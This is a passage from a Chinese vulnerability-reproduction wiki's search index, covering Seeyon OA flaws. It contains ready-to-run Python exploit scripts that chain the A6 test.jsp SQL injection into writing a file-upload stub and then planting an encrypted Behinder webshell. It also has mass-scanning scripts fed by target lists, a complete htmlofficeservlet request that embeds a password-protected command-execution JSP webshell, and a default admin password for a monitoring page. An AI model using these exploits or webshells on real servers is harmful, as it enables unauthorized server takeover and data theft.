Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"c4ca4238a0b923820dcc509a6f75849b\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u4e0b\u8f7d\u5730\u5740: {} \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name ) Goby & POC \u00b6 \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Seeyon_OA_A6_test.jsp_SQL_injection","title":"\u81f4\u8fdcOA A6 test.jsp SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u81f4\u8fdcoa-a6-testjsp-sql\u6ce8\u5165\u6f0f\u6d1e","text":"","title":"\u81f4\u8fdcOA A6 test.jsp SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u81f4\u8fdcOA A6 test.jsp \u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u5e76\u53ef\u4ee5\u901a\u8fc7\u6ce8\u5165\u5199\u5165webshell\u6587\u4ef6\u63a7\u5236\u670d\u52a1\u5668","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u81f4\u8fdcOA A6","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"\u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6.A6\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95eeURL http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database()) \u8fd4\u56de\u4e86\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93 \u8981\u60f3\u5199\u5165shell\u9700\u8981\u77e5\u9053\u5199\u5165\u7684\u8def\u5f84 \u8fd9\u91cc\u5f97\u5230\u8def\u5f84 D:\\Program Files\\UFseeyon\\OA\\mysql\\bin..\\ \u901a\u8fc7 into outfile \u5199\u5165\u6587\u4ef6\uff0c\u8fd9\u91cc\u56e0\u4e3a jsp\u6728\u9a6c\u5b58\u5728\u7279\u6b8a\u7b26\u53f7\uff0c\u4f7f\u7528 hex\u7f16\u7801 \u4e0a\u4f20\u5141\u8bb8\u6587\u4ef6\u4e0a\u4f20\u7684jsp\u6587\u4ef6 <%i f ( request . getParameter ( \"f\" ) != null )( new java . io . FileOutputStream ( application . getRealPath ( \"\\\\\" ) + request . getParameter ( \"f\" ))). write ( request . getParameter ( \"t\" ). getBytes ()); %> HEX\u7f16\u7801 3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C5C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27E:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/peiqi_upload.jsp%27 \u663e\u793a\u4e0a\u56fe\u5219\u4e0a\u4f20\u6210\u529f\uff0c\u8bbf\u95ee peiqi_upload.jsp \u4e3a\u7a7a\u767d\u4e0d\u62a5\u9519\u9875\u9762\u4e0d\u5b58\u5728\u5c31\u662f\u4e0a\u4f20\u6210\u529f \u5728\u53d1\u9001\u8bf7\u6c42\u5305\u4e0a\u4f20webshell\uff0c\u8fd9\u91cc\u4e0a\u4f20\u51b0\u874e [!NOTE] \u6ce8\u610f\u4e0a\u4f20\u7684webshell\u9700\u8981url\u7f16\u7801\u4e00\u4e0b http://xxx.xxx.xxx.xxx/yyoa/peiqi_upload.jsp?f=peiqiwebshell.jsp t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E \u8fde\u63a5\u6728\u9a6c","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] EXP\u6728\u9a6c\u4e0a\u4f20 import requests import sys import random import re import base64 import time import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , verify = False , timeout = 5 ) if '\u5e8f\u53f7' in response . text and \"@@basedir\" in response . text and response . status_code == 200 : OA_dir = re . findall ( r '>(.*) \\\\ UFseeyon \\\\ ' , response . text )[ 0 ] OA_dir = OA_dir [: 2 ] + '/' + OA_dir [ 3 :] print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e, \u5b89\u88c5\u8def\u5f84\u4e3a: {} \\033 [0m\" . format ( target_url , OA_dir )) webshell_name = \"peiqi_upload {} .jsp\" . format ( random . randint ( 1 , 999 )) OA_dir = OA_dir + \"/UFseeyon/OA/tomcat/webapps/yyoa/ {} \" . format ( webshell_name ) POC_2 ( target_url , OA_dir , webshell_name ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) def POC_2 ( target_url , OA_dir , webshell_name ): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=select %20u nhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27) %20% 20into %20o utfile %20% 27 {} %27\" . format ( OA_dir ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , verify = False , timeout = 5 ) if 'already' in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u6587\u4ef6\u5199\u5165\u6728\u9a6c\u4e0a\u4f20\u5931\u8d25\uff0c\u76ee\u6807\u5df2\u5b58\u5728\u76f8\u540c\u6587\u4ef6\uff0c\u8bf7\u91cd\u65b0\u8fd0\u884c \\033 [0m\" ) elif \"No Data\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u6587\u4ef6\u5199\u5165\u6728\u9a6c\u4e0a\u4f20\u6210\u529f\uff0c\u4e0a\u4f20\u8def\u5f84\u4e3a {} \\033 [0m\" . format ( OA_dir )) POC_3 ( target_url , webshell_name ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u6728\u9a6c\u4e0a\u4f20\u5931\u8d25 \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) def POC_3 ( target_url , webshell_name ): rebe_webshell = \"peiqiwebshell {} .jsp\" . format ( random . randint ( 1 , 999 )) vuln_url = target_url + \"/yyoa/ {} ?f= {} \" . format ( webshell_name , rebe_webshell ) data = \"t=%3C %25% 40page %20i mport%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.* %22% 25 %3E %3C%25!class%20U %20e xtends%20ClassLoader%7BU(ClassLoader %20c )%7Bsuper(c)%3B%7Dpublic%20Class %20g (byte %20% 5B%5Db)%7Breturn %20s uper.defineClass(b%2C0%2Cb.length)%3B%7D%7D %25% 3E%3C %25i f%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D %22e 45e329feb5d925b %22% 3Bsession.putValue( %22u%22% 2Ck)%3BCipher %20c %3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new %20s un.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D %25% 3E\" headers = { \"Content-Type\" : \"application/x-www-form-urlencoded\" } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42\uff1a {} \\033 [0m\" . format ( vuln_url )) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6728\u9a6c\u4e0a\u4f20\u6210\u529f, \u8def\u5f84\u4e3a: {} /yyoa/ {} \\033 [0m\" . format ( target_url , rebe_webshell )) print ( \" \\033 [32m[o] \u8bf7\u4f7f\u7528\u51b0\u874e\u8fde\u63a5\uff0c\u5bc6\u7801\u4e3a: rebeyond \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u6728\u9a6c\u4e0a\u4f20\u5931\u8d25\uff0c\u53ef\u80fd\u88ab\u62e6\u622a \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) [!NOTE] \u591a\u4e2a\u76ee\u6807\u6d4b\u8bd5 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"c4ca4238a0b923820dcc509a6f75849b\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u4e0b\u8f7d\u5730\u5740: {} \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#goby--poc","text":"\u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Seeyon_OA_A6_test.jsp_SQL_injection","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20htmlofficeservlet%20RCE%E6%BC%8F%E6%B4%9E/","text":"\u81f4\u8fdc OA A8 htmlofficeservlet RCE\u6f0f\u6d1e CNVD-2019-19299 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u8be5\u6f0f\u6d1e\u6700\u65e9\u4e8e6\u670826\u53f7\u5de6\u53f3\uff0c\u6709\u5b89\u5168\u5382\u5546\u53d1\u51fa\u6f0f\u6d1e\u9884\u8b66\u3002 \u8fdc\u7a0b\u653b\u51fb\u8005\u5728\u65e0\u9700\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u53ef\u901a\u8fc7\u5411 URL /seeyon/htmlofficeservlet POST \u7cbe\u5fc3\u6784\u9020\u7684\u6570\u636e\u5373\u53ef\u5411\u76ee\u6807\u670d\u52a1\u5668\u5199\u5165\u4efb\u610f\u6587\u4ef6\uff0c\u5199\u5165\u6210\u529f\u540e\u53ef\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u8fdb\u800c\u63a7\u5236\u76ee\u6807\u670d\u52a1\u5668\u3002 FOFA \u00b6 [!NOTE] title=\"\u81f4\u8fdcA8-V5\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V6.1sp1\" \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u81f4\u8fdcA8-V5\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V6.1sp1 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.0\u3001V7.0sp1\u3001V7.0sp2\u3001V7.0sp3 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.1 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u76ee\u6807\u7ad9\u70b9 http://xxx.xxx.xxx.xxx:8088/seeyon/htmlofficeservlet \u51fa\u73b0\u5982\u4e0b\u56fe\u54cd\u5e94\uff0c\u5219\u53ef\u80fd\u542b\u6709\u6f0f\u6d1e \u4f7f\u7528POST\u8bf7\u6c42\u53d1\u51fa\u5982\u4e0b\u8bf7\u6c42\u5305 DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"calsee\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>>a6e4f045d4b8506bf492ada7e3390d7ce \u51fa\u73b0\u5982\u56fe\u54cd\u5e94\u5219\u4e3a\u4e0a\u4f20\u6210\u529f \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8088/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir \u6f0f\u6d1e\u5229\u7528POC \u00b6 Goby\u4e2d\u542b\u6709\u6f0f\u6d1e\u68c0\u6d4bPOC","title":"\u81f4\u8fdcOA A8 htmlofficeservlet RCE\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20htmlofficeservlet%20RCE%E6%BC%8F%E6%B4%9E/#\u81f4\u8fdc-oa-a8-htmlofficeservlet-rce\u6f0f\u6d1e-cnvd-2019-19299","text":"","title":"\u81f4\u8fdc OA A8 htmlofficeservlet RCE\u6f0f\u6d1e CNVD-2019-19299"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20htmlofficeservlet%20RCE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u8be5\u6f0f\u6d1e\u6700\u65e9\u4e8e6\u670826\u53f7\u5de6\u53f3\uff0c\u6709\u5b89\u5168\u5382\u5546\u53d1\u51fa\u6f0f\u6d1e\u9884\u8b66\u3002 \u8fdc\u7a0b\u653b\u51fb\u8005\u5728\u65e0\u9700\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u53ef\u901a\u8fc7\u5411 URL /seeyon/htmlofficeservlet POST \u7cbe\u5fc3\u6784\u9020\u7684\u6570\u636e\u5373\u53ef\u5411\u76ee\u6807\u670d\u52a1\u5668\u5199\u5165\u4efb\u610f\u6587\u4ef6\uff0c\u5199\u5165\u6210\u529f\u540e\u53ef\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u8fdb\u800c\u63a7\u5236\u76ee\u6807\u670d\u52a1\u5668\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20htmlofficeservlet%20RCE%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"\u81f4\u8fdcA8-V5\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V6.1sp1\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20htmlofficeservlet%20RCE%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u81f4\u8fdcA8-V5\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V6.1sp1 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.0\u3001V7.0sp1\u3001V7.0sp2\u3001V7.0sp3 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.1","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20htmlofficeservlet%20RCE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u76ee\u6807\u7ad9\u70b9 http://xxx.xxx.xxx.xxx:8088/seeyon/htmlofficeservlet \u51fa\u73b0\u5982\u4e0b\u56fe\u54cd\u5e94\uff0c\u5219\u53ef\u80fd\u542b\u6709\u6f0f\u6d1e \u4f7f\u7528POST\u8bf7\u6c42\u53d1\u51fa\u5982\u4e0b\u8bf7\u6c42\u5305 DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"calsee\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>>a6e4f045d4b8506bf492ada7e3390d7ce \u51fa\u73b0\u5982\u56fe\u54cd\u5e94\u5219\u4e3a\u4e0a\u4f20\u6210\u529f \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8088/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20htmlofficeservlet%20RCE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"Goby\u4e2d\u542b\u6709\u6f0f\u6d1e\u68c0\u6d4bPOC","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20%E7%8A%B6%E6%80%81%E7%9B%91%E6%8E%A7%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","text":"\u81f4\u8fdcOA A8 \u72b6\u6001\u76d1\u63a7\u9875\u9762\u4fe1\u606f\u6cc4\u9732 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u81f4\u8fdcOA A8-m \u5b58\u5728\u72b6\u6001\u76d1\u63a7\u9875\u9762\u4fe1\u606f\u6cc4\u9732\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u5176\u4e2d\u83b7\u53d6\u7f51\u7ad9\u8def\u5f84\u548c\u7528\u6237\u540d\u7b49\u654f\u611f\u4fe1\u606f\u8fdb\u4e00\u6b65\u653b\u51fb \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u81f4\u8fdcOA A8-m FOFA \u00b6 [!NOTE] title=\"A8-m\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u76d1\u63a7\u9875\u9762 http://xxx.xxx.xxx.xx/seeyon/management/status.jsp \u540e\u53f0\u5bc6\u7801\u4e3a WLCCYBD@SEEYON \u767b\u5f55\u540e\u901a\u8fc7\u5982\u4e0burl\u83b7\u5f97\u4e00\u4e9b\u654f\u611f\u4fe1\u606f /seeyon/management/status.jsp /seeyon/logs/login.log /seeyon/logs/v3x.log \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] \u591a\u4e2a\u76ee\u6807 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/seeyon/management/index.jsp\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if response . status_code == 200 and \"Password\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u540e\u53f0\u76d1\u63a7\u5730\u5740 {} 